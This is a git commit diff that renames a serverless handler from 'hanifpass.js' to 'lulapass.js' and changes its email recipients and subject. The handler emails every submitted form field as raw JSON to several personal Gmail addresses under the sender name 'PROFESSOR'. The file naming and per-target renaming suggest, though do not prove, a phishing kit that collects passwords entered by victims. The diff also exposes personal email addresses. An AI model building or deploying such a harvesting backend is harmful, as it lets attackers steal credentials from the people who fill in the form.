eca6bb577de7c997c094864c76c44c3f818744a6
linkquarry-hub <linkquarry@gmail.com>
2025-11-17 09:55:25 +0500

    Update and rename hanifpass.js to lulapass.js

--- lulapass.js
+++ lulapass.js
@@ -38,8 +38,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,ahamdtoufique@gmail.com,",
-      subject: "Hanif",
+      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,jangeraall3@gmail.com",
+      subject: "lula",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
